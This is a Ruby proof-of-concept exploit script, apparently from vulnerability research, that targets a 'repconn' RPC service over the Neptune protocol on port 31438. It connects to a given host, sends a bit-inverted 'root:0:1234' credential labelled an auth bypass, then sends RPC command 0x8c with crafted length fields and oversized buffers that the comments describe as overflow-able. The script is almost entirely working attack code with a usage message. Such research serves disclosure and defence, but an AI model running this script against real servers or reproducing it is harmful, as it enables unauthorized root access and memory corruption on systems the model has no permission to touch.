# Encoding: ASCII-8BIT

require 'base64'
require 'pp'

require_relative './libneptune'

def usage
  puts "Usage: #{ $0 } <host> [port]"
  puts
  puts "Eg:"
  puts
  puts "ruby #{ $0 } 10.0.0.198 31438"
  exit
end

HOST = ARGV[0] || usage()
PORT = ARGV[1] || "31438"

# Connect to the target
connection = LibNeptune::new(HOST, PORT)

puts "Connecting to 'repconn' service:"
pp connection.send_recv(
  args: [
    # Service name
    { type: :string, value: 'unirep82' },

    # "SSL Flag" - must be non-zero if the service is started in "secure-only" mode (-s)
    { type: :integer, value: 1337 },
  ],
)

pp connection.send_recv(
  args: [
    { type: :string, value: ":local:" },

    # Use auth bypass
    { type: :string, value: "root:0:1234".bytes.map { |b| (0x0FF & (~b)).chr }.join },
  ],
)

DATA = "A" + # Length of the first string read from the string value
  "B" + # Length of the second string read from the string value
  "CD" + # Stored in various places
  "\x01\x00" + # Length of the third read (overflow-able)
  "\x01\x00" + # Another length field
  "\x03\x00" + # Memory is allocated based on this: (n * 0x298) + 0x4b8

  # Limit?
  # This is used in a loop at the end
  "\x02\x00" + # This needs to be lower then the previous value, is used in part2

  "MNOPQRST" + # These are stored in various places, probably important
  "\x10\x00\x01\x00" + # If this is 0x00010010, a bunch more processing is done
  "Y" + # Read right after checking the previous field, must be lower than "limit?"
  "Zabcdef"

DATA2 = "A" * 100

pp connection.send_recv(
  args: [
    { type: :integer, value: 0x8c }, # RPC Command
    { type: :bytes, value: DATA },
    { type: :string, value: "\x41" * (200) },

    { type: :bytes, value: DATA2 },
    { type: :string, value: "\x00" * (200) },
  ],
)
